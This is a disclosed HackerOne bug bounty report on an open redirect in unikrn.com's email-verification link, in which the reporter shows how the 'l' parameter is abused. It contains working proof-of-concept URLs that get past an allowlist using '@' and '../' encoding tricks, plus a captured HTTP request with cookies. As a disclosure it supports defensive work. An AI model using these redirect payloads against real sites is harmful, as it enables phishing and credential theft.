# Open Redirection leads to redirect Users to malicious website

## Report Details
- **Report ID**: 625546
- **URL**: https://hackerone.com/reports/625546
- **State**: Closed
- **Severity**: none
- **Submitted**: 2019-06-22T09:51:54.371Z
- **Disclosed**: 2020-05-06T15:43:19.535Z

## Reporter
- **Username**: bb00x
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: unikrn

## Vulnerability Information
---
Summary
---

I found an open redirect bug on unikoingold.com .First, I create an account on unikoingold.com , I fill all the forms with the required information (First name,Birth,etc...), until I came on the final step to verify my account , there was a mechanism to send a verification link to my email , therefore ,I open my email an click to this LINK to confirm my account and using burp suite proxy to see what traffic is passed into this request so I came over this url `https://unikrn.com//s/doi?h=maafad1d6d_cb9789f50190531e43c7409eeead93ff1a7e21ff&l=//www.whitelisteddomain.tld@localdomain.pw/../&utm_medium=doi&utm_campaign=doi_welcome` then I try to play with `l` parametre until I have redirection to my input (Malicious website with XSS code executed).

---
Steps
---

1. Create An account on unikoingold.com .
2. Set up your Burp suite proxy with your browser .
3. Intercept the request Like This :

```http
GET /s/doi?h=maafad1d6d_cb9789f50190531e43c7409eeead93ff1a7e21ff&l=//www.whitelisteddomain.tld@localdomain.pw/%2e%2e%2f&utm_medium=doi&utm_campaign=doi_welcome HTTP/1.1
Host: unikrn.com
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: __cfduid=dc2e81d88677939ce456f73a18c2a09b51561192429; CW=fplg5rn6s118blhgpb20hi0phlhuv4jr
```
4 . Note the Value of ``l`` parametre 
5 . Or just Click on this [URL POC](https://unikrn.com//s/doi?h=maafad1d6d_cb9789f50190531e43c7409eeead93ff1a7e21ff&l=//www.whitelisteddomain.tld@localdomain.pw/../&utm_medium=doi&utm_campaign=doi_welcome) ***You must be logged in***
6 . Redirected successfully and Javascript code Executed .

-------

##POC
* `https://unikrn.com//s/doi?h=maafad1d6d_cb9789f50190531e43c7409eeead93ff1a7e21ff&l=//www.whitelisteddomain.tld@localdomain.pw/../&utm_medium=doi&utm_campaign=doi_welcome`
 
* `https://unikrn.com//s/doi?h=maafad1d6d_cb9789f50190531e43c7409eeead93ff1a7e21ff&l=///localdomain.pw/%2e%2e%2f&utm_medium=doi&utm_campaign=doi_welcome`


{F514634}

-----------

## Impact

* An Attacker can redirect user to a malicious website and execute some dangerous script to steal credentiels .

* Simplifies pishing Attacks .

## Attachments
- 2019-06-22_11-47-15.mp4
